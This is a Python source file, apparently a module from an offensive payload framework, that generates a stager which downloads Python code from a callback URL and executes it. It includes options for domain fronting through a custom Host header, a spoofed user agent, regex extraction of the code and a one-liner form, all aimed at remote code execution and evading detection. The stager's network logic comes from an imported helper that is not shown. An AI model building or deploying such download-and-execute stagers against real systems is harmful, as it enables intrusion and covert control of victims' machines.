from payloads.modules.python.common import urllib_callback


class Module:

    def __init__(self, params=[]):

        self.info = {
            'Author': 'Alain Homewood',
            'Description': 'Retrieves and executes Python code from a URL using urllib',
        }

        self.options = {
            'Callback URL': {
                'Description': 'The callback URL to retrieve Python code from',
                'Required': True,
                'Type': 'url',
                'Value': ''
            },
            'Host Header': {
                'Description': '(Optional) Specify a custom Host header (i.e. for domain fronting)',
                'Required': False,
                'Type': 'text',
                'Value': ''
            },
            'User Agent': {
                'Description': '(Optional) Specify a custom user agent',
                'Required': False,
                'Type': 'text',
                'Value': ''
            },
            'Regex': {
                'Description': '(Optional) Specify a regular expression to extract Python code from the response',
                'Required': False,
                'Type': 'text',
                'Value': ''
            },
            'Exception Handling': {
                'Description': 'Wrap the stager in a Try Except block? (disable for a one liner)',
                'Required': False,
                'Type': 'boolean',
                'Value': 'True'
            },
        }

        for param in params:
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):
        if self.options['Exception Handling']['Value'].lower() == "false":
            try_except = False
        else:
            try_except = True

        code = urllib_callback(url=self.options['Callback URL']['Value'],
                               host_header=self.options['Host Header']['Value'],
                               user_agent=self.options['User Agent']['Value'],
                               regex=self.options['Regex']['Value'],
                               try_except_wrap=try_except)
        return code
